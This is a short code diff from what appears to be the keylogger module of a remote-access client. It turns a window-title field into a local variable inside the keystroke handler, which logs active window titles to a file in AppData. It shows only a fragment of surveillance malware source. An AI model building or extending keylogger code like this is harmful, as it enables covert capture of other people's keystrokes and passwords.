@@ -16,7 +16,6 @@ namespace xClient.Core.Keylogger
         private bool _disposed = false;
 
         private StringBuilder _logFileBuffer;
-        private string _hWndTitle;
         private string _hWndLastTitle;
 
         private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
@@ -132,7 +131,7 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
+            string _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
             if (!string.IsNullOrEmpty(_hWndTitle))
             {
                 // Only write the title to the log file if the names are different.
